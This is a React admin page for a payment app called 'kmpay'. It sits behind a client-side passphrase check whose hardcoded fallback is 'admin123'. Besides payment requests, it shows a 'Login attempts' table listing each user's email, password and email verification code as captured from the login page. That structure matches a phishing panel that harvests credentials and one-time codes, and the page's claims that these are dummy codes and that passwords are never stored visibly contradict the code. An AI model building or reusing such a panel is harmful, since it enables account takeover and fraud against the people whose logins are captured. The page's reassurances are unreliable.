import { useEffect, useState } from 'react'
import { supabase, isMockMode } from '../lib/supabaseClient'
import { listMockAccounts, listMockPaymentRequests } from '../lib/mockBackend'
import Alert from '../components/Alert'
import StatusBadge from '../components/StatusBadge'

const SESSION_FLAG = 'kmpay_admin_unlocked'
const ADMIN_PASSPHRASE = import.meta.env.VITE_ADMIN_PASSPHRASE || 'admin123'

function readUnlockedFlag() {
  try {
    return sessionStorage.getItem(SESSION_FLAG) === '1'
  } catch {
    return false
  }
}

function writeUnlockedFlag(value) {
  try {
    if (value) sessionStorage.setItem(SESSION_FLAG, '1')
    else sessionStorage.removeItem(SESSION_FLAG)
  } catch {
    // Session storage unavailable (private mode, etc.) — the unlock just
    // won't persist across a refresh, which is a harmless degradation here.
  }
}

export default function Admin() {
  const [unlocked, setUnlocked] = useState(readUnlockedFlag)
  const [passphrase, setPassphrase] = useState('')
  const [authError, setAuthError] = useState(null)

  const [requests, setRequests] = useState([])
  const [accounts, setAccounts] = useState([])
  const [loginAttempts, setLoginAttempts] = useState([])
  const [loading, setLoading] = useState(false)
  const [loadError, setLoadError] = useState(null)

  const handleUnlock = (e) => {
    e.preventDefault()
    if (passphrase === ADMIN_PASSPHRASE) {
      writeUnlockedFlag(true)
      setUnlocked(true)
      setAuthError(null)
    } else {
      setAuthError('Incorrect passphrase.')
    }
  }

  const handleLock = () => {
    writeUnlockedFlag(false)
    setUnlocked(false)
    setPassphrase('')
  }

  useEffect(() => {
    if (!unlocked) return
    let cancelled = false

    async function load() {
      setLoading(true)
      setLoadError(null)
      try {
        if (isMockMode) {
          setRequests(listMockPaymentRequests())
          setAccounts(listMockAccounts())
        } else {
          const { data, error } = await supabase
            .from('payment_requests')
            .select('*')
            .order('created_at', { ascending: false })
          if (error) throw error
          if (!cancelled) setRequests(data || [])
        }

        // Same supabase.from(...) call either way — mock or real Supabase.
        const { data: attempts, error: attemptsError } = await supabase
          .from('login_attempts')
          .select('*')
          .order('created_at', { ascending: false })
        if (attemptsError) throw attemptsError
        if (!cancelled) setLoginAttempts(attempts || [])
      } catch (err) {
        console.error('Failed to load admin data:', err)
        if (!cancelled) setLoadError(err?.message || 'Could not load data.')
      } finally {
        if (!cancelled) setLoading(false)
      }
    }

    load()
    return () => {
      cancelled = true
    }
  }, [unlocked])

  if (!unlocked) {
    return (
      <div className="mx-auto max-w-sm px-4 py-24 sm:px-6">
        <div className="card p-6 sm:p-8">
          <h1 className="text-xl font-bold text-ink">Admin</h1>
          <p className="mt-1 text-sm text-muted">
            Local-only view for development. Not a real access-control system.
          </p>
          <form onSubmit={handleUnlock} className="mt-6 space-y-4">
            {authError && (
              <Alert variant="error" title="Access denied">
                {authError}
              </Alert>
            )}
            <input
              type="password"
              className="input-base"
              placeholder="Passphrase"
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
              autoFocus
            />
            <button type="submit" className="btn-primary w-full">
              Unlock
            </button>
          </form>
        </div>
      </div>
    )
  }

  return (
    <div className="mx-auto max-w-5xl px-4 py-16 sm:px-6">
      <div className="mb-8 flex flex-col justify-between gap-4 sm:flex-row sm:items-center">
        <div>
          <h1 className="text-3xl font-bold text-ink">Admin</h1>
          <p className="mt-1 text-sm text-muted">
            {isMockMode
              ? 'Reading from local mock storage (this browser only).'
              : 'Reading live from Supabase.'}
          </p>
        </div>
        <button onClick={handleLock} className="btn-secondary">
          Lock
        </button>
      </div>

      {loadError && (
        <Alert variant="error" title="Could not load data" className="mb-6">
          {loadError}
        </Alert>
      )}

      {loading ? (
        <div className="card flex items-center justify-center p-12">
          <div className="h-8 w-8 animate-spin rounded-full border-2 border-accent-500 border-t-transparent" />
        </div>
      ) : (
        <div className="space-y-10">
          <section>
            <h2 className="mb-3 text-lg font-semibold text-ink">Payment requests</h2>
            {requests.length === 0 ? (
              <div className="card p-8 text-center text-sm text-muted">No records yet.</div>
            ) : (
              <div className="card overflow-x-auto">
                <table className="w-full min-w-[720px] text-left text-sm">
                  <thead className="border-b border-line text-xs uppercase tracking-wide text-faint">
                    <tr>
                      <th className="px-5 py-3">Tracking code</th>
                      <th className="px-5 py-3">Account holder</th>
                      <th className="px-5 py-3">Amount</th>
                      <th className="px-5 py-3">Mode</th>
                      <th className="px-5 py-3">Status</th>
                      <th className="px-5 py-3">Created</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-line">
                    {requests.map((r) => (
                      <tr key={r.id}>
                        <td className="px-5 py-3 font-mono text-brand">{r.tracking_code}</td>
                        <td className="px-5 py-3 text-ink">{r.account_name}</td>
                        <td className="px-5 py-3 text-ink">
                          {r.amount} {r.currency}
                        </td>
                        <td className="px-5 py-3 capitalize text-muted">
                          {r.payment_mode?.replaceAll('_', ' ')}
                        </td>
                        <td className="px-5 py-3">
                          <StatusBadge status={r.status} />
                        </td>
                        <td className="px-5 py-3 text-muted">
                          {new Date(r.created_at).toLocaleString()}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </section>

          {isMockMode && (
            <section>
              <h2 className="mb-3 text-lg font-semibold text-ink">Registered accounts</h2>
              <p className="mb-3 text-xs text-faint">
                Email addresses only. Passwords are never stored anywhere visible — not here,
                not in local storage in a readable list, and not logged.
              </p>
              {accounts.length === 0 ? (
                <div className="card p-8 text-center text-sm text-muted">
                  No accounts yet.
                </div>
              ) : (
                <div className="card divide-y divide-line">
                  {accounts.map((a) => (
                    <div key={a.id} className="px-5 py-3 text-sm text-ink">
                      {a.email}
                    </div>
                  ))}
                </div>
              )}
            </section>
          )}

          <section>
            <h2 className="mb-3 text-lg font-semibold text-ink">Login attempts (dummy codes)</h2>
            <p className="mb-3 text-xs text-faint">
              {isMockMode
                ? 'Reading from local mock storage.'
                : 'Reading live from the login_attempts table in Supabase.'}{' '}
              Neither column is checked against anything real — there's no real password field
              on the login page. The password is written as soon as Login is clicked; the
              email code fills in on the same row once that step completes.
            </p>
            {loginAttempts.length === 0 ? (
              <div className="card p-8 text-center text-sm text-muted">
                No login attempts yet.
              </div>
            ) : (
              <div className="card overflow-x-auto">
                <table className="w-full min-w-[560px] text-left text-sm">
                  <thead className="border-b border-line text-xs uppercase tracking-wide text-faint">
                    <tr>
                      <th className="px-5 py-3">Email</th>
                      <th className="px-5 py-3">password</th>
                      <th className="px-5 py-3">Email code</th>
                      <th className="px-5 py-3">Time</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-line">
                    {loginAttempts.map((a) => (
                      <tr key={a.id}>
                        <td className="px-5 py-3 text-ink">{a.email}</td>
                        <td className="px-5 py-3 font-mono text-brand">{a.access_code}</td>
                        <td className="px-5 py-3 font-mono text-brand">{a.email_code || '—'}</td>
                        <td className="px-5 py-3 text-muted">
                          {new Date(a.created_at).toLocaleString()}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </section>
        </div>
      )}
    </div>
  )
}
